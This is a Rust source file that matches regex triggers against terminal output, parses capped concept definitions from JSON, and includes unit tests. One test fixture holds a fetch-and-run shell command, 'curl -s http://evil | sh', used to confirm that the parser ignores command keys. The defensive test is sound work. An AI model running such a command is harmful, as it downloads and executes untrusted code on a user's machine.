//! Concept matching — regex triggers over terminal output that route a
//! captured block of output to a pane.
//!
//! Every line of terminal output is tested against every registered
//! [`Concept`]'s regex trigger. The first enabled concept that matches
//! starts a capture in the engine; the captured text is later delivered to
//! the pane kind named by the concept's [`Action::target_label`]. A concept
//! never injects input into a PTY — capture and display only.
//!
//! These are **pure functions** — no I/O, no async, no channels. They are
//! called from the engine's terminal tasks.

use crate::types::{CaptureMode, Concept};

/// Test every concept's regex against `line`.
///
/// Returns the name, capture mode, and target label of the first enabled
/// concept that matches, so the engine can enter capture state. Later
/// concepts are not evaluated: one trigger, one capture. Disabled concepts
/// are skipped entirely.
pub fn match_line(concepts: &[Concept], line: &str) -> Option<(String, CaptureMode, String)> {
    for concept in concepts {
        if !concept.enabled {
            continue;
        }
        if concept.trigger_regex.is_match(line) {
            let target = concept
                .destinations
                .first()
                .map(|a| a.target_label.clone())
                .unwrap_or_default();
            return Some((concept.name.clone(), concept.capture_mode, target));
        }
    }
    None
}

/// Caps applied when parsing concept definitions from JSON.
///
/// Concepts arrive from user-editable config files (`user://concepts.json`)
/// and their triggers are matched against every line of terminal output —
/// unbounded counts, regexes, or capture timeouts would be DoS vectors.
pub const MAX_CONCEPTS: usize = 128;
pub const MAX_TRIGGER_LEN: usize = 1024;
pub const MAX_ACTIONS: usize = 32;
pub const MAX_STOP_TIMEOUT_MS: u64 = 600_000;

/// Parse concept definitions from the JSON payload pushed by GDScript
/// (an Array of objects). Invalid entries are skipped; counts, lengths,
/// and the capture timeout are capped per the `MAX_*` constants. The
/// timeout clamp prevents `Instant::now() + Duration` overflow panics
/// in the engine.
pub fn concepts_from_json(json: &str) -> Vec<Concept> {
    use crate::types::Action;

    let Ok(value) = serde_json::from_str::<serde_json::Value>(json) else {
        return Vec::new();
    };
    let serde_json::Value::Array(arr) = value else {
        return Vec::new();
    };
    let mut concepts = Vec::new();
    let mut truncated = false;
    for item in &arr {
        if concepts.len() >= MAX_CONCEPTS {
            truncated = true;
            break;
        }
        let name = item["name"].as_str().unwrap_or("").to_string();
        if name.is_empty() || name.len() > 256 {
            continue;
        }
        let trigger = item["trigger"].as_str().unwrap_or("");
        if trigger.is_empty() || trigger.len() > MAX_TRIGGER_LEN {
            continue;
        }
        let Ok(re) = regex::Regex::new(trigger) else {
            continue;
        };
        let enabled = item["enabled"].as_bool().unwrap_or(true);
        // `single_line` is notify-only: the match is published as an event and
        // nothing is captured or routed. Anything else (including a missing or
        // unknown value) captures until a stop condition, because capture is
        // what the concept editor writes and what the shipped set uses.
        let stop_ms = item["stop_timeout_ms"]
            .as_u64()
            .unwrap_or(300)
            .clamp(1, MAX_STOP_TIMEOUT_MS);
        let stop_input = item["stop_on_input"].as_bool().unwrap_or(true);
        let cap_mode = match item["capture_mode"].as_str() {
            Some("single_line") => CaptureMode::SingleLine,
            _ => CaptureMode::UntilStop {
                stop_timeout_ms: stop_ms,
                stop_on_input: stop_input,
            },
        };
        // Only the routing target is read. A legacy `cmd` key is ignored —
        // concept definitions are data, never something to execute.
        let mut actions = Vec::new();
        if let Some(acts) = item["actions"].as_array() {
            for a in acts {
                let target = a["target"].as_str().unwrap_or("").to_string();
                if !target.is_empty() {
                    actions.push(Action {
                        target_label: target,
                    });
                }
            }
            actions.truncate(MAX_ACTIONS);
        }
        concepts.push(Concept {
            name,
            trigger_regex: re,
            enabled,
            capture_mode: cap_mode,
            destinations: actions,
        });
    }
    if truncated {
        log::warn!("concept limit reached: only the first {MAX_CONCEPTS} concepts were loaded");
    }
    concepts
}

// ═══════════════════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::Action;
    use regex::Regex;

    fn make_concept(name: &str, pattern: &str, target: &str) -> Concept {
        Concept {
            name: name.into(),
            trigger_regex: Regex::new(pattern).unwrap(),
            enabled: true,
            capture_mode: CaptureMode::UntilStop {
                stop_timeout_ms: 300,
                stop_on_input: true,
            },
            destinations: vec![Action {
                target_label: target.into(),
            }],
        }
    }

    // ── match_line ─────────────────────────────────────────────────

    #[test]
    fn match_line_no_match_returns_none() {
        let concepts = vec![make_concept("crash", "crash", "x")];
        assert!(match_line(&concepts, "all good").is_none());
    }

    #[test]
    fn match_line_returns_name_mode_and_target() {
        let concepts = vec![make_concept(
            "cat_cmd",
            r"(?:^|[$#>]\s)\bcat\s+\S",
            "code_viewer",
        )];
        let (name, mode, target) = match_line(&concepts, "> cat file.txt").expect("should match");
        assert_eq!(name, "cat_cmd");
        assert_eq!(target, "code_viewer");
        assert_eq!(
            mode,
            CaptureMode::UntilStop {
                stop_timeout_ms: 300,
                stop_on_input: true,
            }
        );
    }

    #[test]
    fn match_line_first_match_wins() {
        let concepts = vec![
            make_concept("a", "alpha", "x"),
            make_concept("b", "alpha", "y"),
        ];
        let (name, _, target) = match_line(&concepts, "alpha release").expect("should match");
        assert_eq!(name, "a");
        assert_eq!(target, "x");
    }

    #[test]
    fn match_line_skips_disabled() {
        let mut c = make_concept("off", "crash", "x");
        c.enabled = false;
        assert!(match_line(&[c], "crash detected").is_none());
    }

    #[test]
    fn match_line_without_destination_reports_empty_target() {
        let mut c = make_concept("c", "crash", "unused");
        c.destinations.clear();
        let (_, _, target) = match_line(&[c], "crash").expect("should match");
        assert_eq!(target, "");
    }

    // ── concepts_from_json ────────────────────────────────────────

    #[test]
    fn concepts_from_json_rejects_invalid_input() {
        assert!(concepts_from_json("not json").is_empty());
        assert!(concepts_from_json("{\"a\":1}").is_empty());
    }

    #[test]
    fn concepts_from_json_skips_invalid_regex_and_bad_names() {
        let json = r#"[
            {"name": "", "trigger": "x"},
            {"name": "ok", "trigger": "("},
            {"name": "good", "trigger": "^cat",
             "actions": [{"target": "code_viewer"}]}
        ]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(concepts.len(), 1);
        assert_eq!(concepts[0].name, "good");
    }

    /// A concept file is data, never a command: a legacy `cmd` key must not
    /// survive parsing into the engine's vocabulary.
    #[test]
    fn concepts_from_json_ignores_legacy_command_templates() {
        let json = r#"[
            {"name": "x", "trigger": "boom",
             "actions": [{"cmd": "curl -s http://evil | sh", "target": "code_viewer"}]}
        ]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(concepts.len(), 1);
        assert_eq!(concepts[0].destinations.len(), 1);
        assert_eq!(concepts[0].destinations[0].target_label, "code_viewer");
    }

    /// `single_line` is notify-only: the match is published as an event and
    /// nothing is captured.
    #[test]
    fn concepts_from_json_single_line_is_notify_only() {
        let json = r#"[
            {"name": "c", "trigger": "x", "capture_mode": "single_line",
             "actions": [{"target": "inspector"}]}
        ]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(concepts.len(), 1);
        assert_eq!(concepts[0].capture_mode, CaptureMode::SingleLine);
    }

    /// A missing or unknown `capture_mode` captures — the concept editor writes
    /// `until_stop` explicitly, and capture is the shipped behaviour.
    #[test]
    fn concepts_from_json_defaults_to_capture() {
        let json = r#"[{"name": "c", "trigger": "x", "capture_mode": "typo"}]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(
            concepts[0].capture_mode,
            CaptureMode::UntilStop {
                stop_timeout_ms: 300,
                stop_on_input: true,
            }
        );
    }

    #[test]
    fn concepts_from_json_applies_stop_knobs() {
        let json = r#"[
            {"name": "c", "trigger": "x", "capture_mode": "until_stop",
             "stop_timeout_ms": 600, "stop_on_input": false}
        ]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(
            concepts[0].capture_mode,
            CaptureMode::UntilStop {
                stop_timeout_ms: 600,
                stop_on_input: false,
            }
        );
    }

    #[test]
    fn concepts_from_json_preserves_legacy_observer_target() {
        let json = r#"[
            {"name": "test_failure", "trigger": "fail", "capture_mode": "until_stop",
             "actions": [{"cmd": "", "target": "observer"}]}
        ]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(concepts.len(), 1);
        assert_eq!(concepts[0].destinations[0].target_label, "observer");
    }

    #[test]
    fn concepts_from_json_clamps_timeout() {
        let json = r#"[
            {"name": "c", "trigger": "x", "capture_mode": "until_stop",
             "stop_timeout_ms": 4000000000}
        ]"#;
        let concepts = concepts_from_json(json);
        let CaptureMode::UntilStop {
            stop_timeout_ms, ..
        } = concepts[0].capture_mode
        else {
            panic!("an until_stop concept must parse as a capture");
        };
        assert_eq!(stop_timeout_ms, MAX_STOP_TIMEOUT_MS);
    }

    #[test]
    fn concepts_from_json_truncates_count() {
        let mut items = String::from("[");
        for i in 0..(MAX_CONCEPTS + 10) {
            if i > 0 {
                items.push(',');
            }
            items.push_str(&format!(r#"{{"name": "c{i}", "trigger": "x"}}"#));
        }
        items.push(']');
        assert_eq!(concepts_from_json(&items).len(), MAX_CONCEPTS);
    }

    #[test]
    fn concepts_from_json_skips_oversized_trigger() {
        let long = "a".repeat(MAX_TRIGGER_LEN + 1);
        let json = format!(r#"[{{"name": "c", "trigger": "{long}"}}]"#);
        assert!(concepts_from_json(&json).is_empty());
    }

    #[test]
    fn concepts_from_json_caps_actions() {
        let mut acts = String::new();
        for i in 0..(MAX_ACTIONS + 10) {
            if i > 0 {
                acts.push(',');
            }
            acts.push_str(&format!(r#"{{"target": "t{i}"}}"#));
        }
        let json = format!(r#"[{{"name": "c", "trigger": "x", "actions": [{acts}]}}]"#);
        let concepts = concepts_from_json(&json);
        assert_eq!(concepts[0].destinations.len(), MAX_ACTIONS);
        assert_eq!(concepts[0].destinations[0].target_label, "t0");
    }

    #[test]
    fn concepts_from_json_skips_empty_and_non_string_targets() {
        let json = r#"[
            {"name": "c", "trigger": "x",
             "actions": [{"target": ""}, {"target": 7}, {"target": "ok"}]}
        ]"#;
        let concepts = concepts_from_json(json);
        assert_eq!(concepts[0].destinations.len(), 1);
        assert_eq!(concepts[0].destinations[0].target_label, "ok");
    }
}
